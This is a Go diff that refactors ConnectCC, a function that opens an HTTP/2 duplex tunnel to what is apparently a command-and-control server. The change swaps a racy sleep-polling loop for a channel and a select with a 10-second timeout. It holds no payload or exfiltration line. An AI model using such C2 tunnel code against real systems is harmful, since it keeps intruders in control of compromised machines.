@@ -14,14 +14,6 @@ import (
 
 // ConnectCC connect to CC with h2conn
 func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
-	var resp *http.Response
-	defer func() {
-		if conn == nil {
-			err = fmt.Errorf("connectCC at %s failed", url)
-			cancel()
-		}
-	}()
-
 	// use h2conn for duplex tunnel
 	ctx, cancel = context.WithCancel(context.Background())
 
@@ -33,27 +25,44 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 		},
 	}
 	log.Printf("ConnectCC: connecting to %s", url)
+
+	type connectResult struct {
+		conn *h2conn.Conn
+		resp *http.Response
+		err  error
+	}
+	resultChan := make(chan connectResult, 1)
+
 	go func() {
-		conn, resp, err = h2.Connect(ctx, url)
+		c, r, e := h2.Connect(ctx, url)
+		resultChan <- connectResult{conn: c, resp: r, err: e}
+	}()
+
+	select {
+	case res := <-resultChan:
+		conn = res.conn
+		resp := res.resp
+		err = res.err
+
 		if err != nil {
 			err = fmt.Errorf("connectCC: initiate h2 conn: %s", err)
 			log.Print(err)
 			cancel()
+			return
 		}
 		// Check server status code
 		if resp != nil {
 			if resp.StatusCode != http.StatusOK {
 				err = fmt.Errorf("bad status code: %d", resp.StatusCode)
+				conn = nil
+				cancel()
 				return
 			}
 		}
-	}()
-
-	// kill connection on timeout
-	countdown := 10
-	for conn == nil && countdown > 0 {
-		countdown--
-		time.Sleep(time.Second)
+	case <-time.After(10 * time.Second):
+		err = fmt.Errorf("connectCC at %s failed: timeout", url)
+		cancel()
+		return
 	}
 
 	return
